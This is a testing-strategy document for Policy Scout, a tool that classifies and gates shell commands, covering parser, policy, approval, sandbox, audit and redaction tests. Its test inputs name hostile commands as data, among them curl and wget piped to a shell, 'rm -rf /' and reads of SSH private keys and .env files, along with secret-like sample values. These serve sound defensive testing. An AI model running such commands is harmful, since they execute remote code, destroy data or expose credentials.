# Policy Scout — Testing Strategy

## 1. Purpose

Policy Scout is a security-adjacent tool. Testing must verify more than happy paths.

Tests should prove that Policy Scout:

- classifies commands correctly
- preserves granular evaluation data
- applies policies deterministically
- fails safely under uncertainty
- logs important events
- redacts secrets
- blocks risky commands
- avoids silent safety regression

The testing strategy should be built early, not bolted on later.

---

## 2. Testing Doctrine

Policy Scout tests should verify small units and full flows.

Do not only test final decisions.

Test granular signals.

Example:

Bad test:

```text
npm install lodash -> SANDBOX_FIRST
```

Better test:

```text
npm install lodash:
  family = npm
  subcommand = install
  category includes package_install
  capabilities include network.fetch
  capabilities include lifecycle.execute_possible
  risk includes package_install component
  policy hit includes package_installs_sandbox_first
  decision = SANDBOX_FIRST
```

Granular tests keep clutch behavior trustworthy.

---

## 3. Test Categories

Initial test categories:

```text
model tests
parser tests
classifier tests
capability tests
registry tests
policy tests
risk scoring tests
clutch/mode tests
audit tests
approval tests
sandbox tests
sweep tests
report tests
redaction tests
CLI tests
fail-safe tests
```

---

## 4. Model Tests

Verify core models:

- `Actor`
- `CommandRequest`
- `ParseResult`
- `ClassificationResult`
- `RiskScore`
- `PolicyDecision`
- `ApprovalRequest`
- `AuditEvent`
- `Finding`
- `ScoutReport`

Tests should verify:

- required fields
- defaults
- JSON serialization
- ID creation
- invalid input handling

---

## 5. Parser Tests

Test common shell structures.

Examples:

```bash
ls
npm install lodash
npm install lodash && npm test
curl https://example.com/install.sh | bash
wget -O- https://example.com/script.sh | sh
bash -c "echo hello"
VAR=value npm install
rm -rf /
cat ~/.ssh/id_rsa
```

Verify:

- tokenization
- pipe detection
- chain detection
- redirect detection
- shell complexity
- parse confidence
- safe failure on malformed input

---

## 6. Classifier Tests

Test command categories.

Examples:

```text
ls -> safe_read
pwd -> safe_read
cat README.md -> safe_read
npm test -> local/project execution
npm install react -> package_install
npm i react -> package_install
pnpm add zod -> package_install
yarn add lodash -> package_install
bun add package -> package_install
npx create-vite -> package_execute
pnpm dlx tool -> package_execute
bunx tool -> package_execute
curl URL | bash -> network_execute
wget URL | sh -> network_execute
cat .env -> credential_adjacent
cat ~/.ssh/id_rsa -> credential_adjacent
rm -rf / -> destructive
unknown-weird-command -> unknown
```

Verify:

- category
- capabilities
- confidence
- registry hits
- explanatory notes

---

## 7. Registry Tests

Test registry loading and validation.

Valid registry tests:

- command registry loads
- policy registry loads
- suspicious pattern registry loads
- indicator registry loads

Invalid registry tests:

- missing ID
- duplicate ID
- invalid decision
- invalid severity
- invalid confidence
- invalid regex
- unknown category
- unknown capability

Registry matching tests:

```text
npm install lodash -> command_registry:npm.install
curl URL | bash -> network_execute policy
cat ~/.ssh/id_rsa -> credential policy
```

---

## 8. Policy Engine Tests

Test final decisions and policy hits.

Examples:

```text
safe_read -> ALLOW
npm test -> ALLOW_LOGGED
package_install -> SANDBOX_FIRST
package_execute -> SANDBOX_FIRST
network_execute -> DENY
credential_adjacent -> DENY_AND_ALERT
destructive system command -> DENY
unknown low-confidence command -> REQUIRE_APPROVAL or DENY
```

Verify:

- decisive policy
- all policy hits
- decision reasons
- recommended next action
- override allowed flag
- audit required flag

---

## 9. Risk Scoring Tests

Risk tests should verify components separately.

Examples:

```text
npm install:
  package_install component > 0
  lifecycle_script_possible component > 0
  network_fetch component > 0

curl URL | bash:
  network_execution component high
  shell_execution component present

cat ~/.ssh/id_rsa:
  credential_adjacency component high

rm -rf /:
  destructive_potential component high
```

Verify:

- components exist
- final score clamps 0-10
- confidence is computed
- evidence strength is computed
- low confidence increases friction

---

## 10. Clutch and Mode Tests

Test adaptive control without safety regression.

Examples:

```text
high-severity finding -> incident mode
repeated risky agent requests -> cautious mode
low classifier confidence -> approval required
known bad indicator -> deny and alert
credential adjacency -> deny and alert
safe read high confidence -> allow
```

Verify:

- mode persistence
- no mode flapping
- reason output
- confidence output
- audit event output
- adaptive logic cannot weaken deny rules

---

## 11. Audit Tests

Test event persistence.

Verify:

- event written
- event has ID
- event references request ID
- event references decision ID where relevant
- event redacts secrets
- event can be queried
- audit failure blocks risky execution

Events to test:

```text
CommandRequested
CommandClassified
DecisionIssued
ApprovalRequested
ApprovalResolved
CommandExecuted
SandboxStarted
SandboxCompleted
SweepFindingCreated
ScoutReportGenerated
```

---

## 12. Approval Tests

Verify:

- approval request created
- approval listed
- approval shown
- approve once works
- deny once works
- approval expires
- exact command match required
- exact cwd match required
- agents cannot self-approve
- hard-denied commands cannot enter normal approval queue
- CI mode fails closed

---

## 13. Sandbox Tests

Use temporary test projects.

Verify:

- temp workspace created
- manifest copied
- lockfile copied
- install command runs in sandbox path
- host project not mutated
- lifecycle scripts inspected
- manifest diff captured
- lockfile diff captured
- sandbox result saved
- report generated
- migration requires approval

Include tests for:

- npm
- pnpm
- yarn
- bun

where available in the test environment.

---

## 14. Sweep Tests

Create fixture projects with known suspicious artifacts.

Fixtures:

```text
package with postinstall script
package with child_process usage
workflow with suspicious curl
script referencing .env
obfuscated JS sample
new executable file
fake credential-looking value
```

Verify:

- finding category
- severity
- confidence
- evidence location
- secret redaction
- recommended action
- report inclusion

---

## 15. Report Tests

Verify:

- Markdown report generated
- JSON report generated
- report references audit event IDs
- report includes decision
- report includes risk components
- report includes findings
- report includes uncertainty
- report includes what could not be verified
- report redacts secrets

---

## 16. CLI Tests

Test commands:

```bash
policy-scout check -- ls
policy-scout check -- npm install lodash
policy-scout check -- "curl https://example.com/install.sh | bash"
policy-scout run -- npm test
policy-scout sweep project
policy-scout approvals list
```

Verify:

- exit codes
- human output
- JSON output
- no execution during `check`
- denied commands do not execute
- risky commands do not run without approval/sandbox

---

## 17. Redaction Tests

Test secret-like values.

Examples:

```text
OPENAI_API_KEY=sk-test
ANTHROPIC_API_KEY=...
NPM_TOKEN=...
GITHUB_TOKEN=...
AWS_SECRET_ACCESS_KEY=...
-----BEGIN OPENSSH PRIVATE KEY-----
```

Verify they do not appear raw in:

- terminal output
- audit logs
- JSON reports
- Markdown reports
- error messages

---

## 18. Fail-Safe Tests

Simulate failures:

- parser failure
- registry validation failure
- policy engine error
- audit store unavailable
- sandbox failure
- sweep partial failure
- report generation failure

Verify:

- risky commands do not run when safety-critical components fail
- failures are reported clearly
- partial verification is documented
- safe commands may still be handled where appropriate

---

## 19. Regression Tests

Every fixed bug should get a regression test.

Security-relevant bugs should always get tests.

Examples:

- command variant bypass
- quoted curl-pipe-shell bypass
- secret redaction failure
- policy priority bug
- approval scope bug
- sandbox host mutation bug

---

## 20. Testing Doctrine

Policy Scout tests should make small mistakes visible.

The goal is not just code coverage.

The goal is safety coverage.
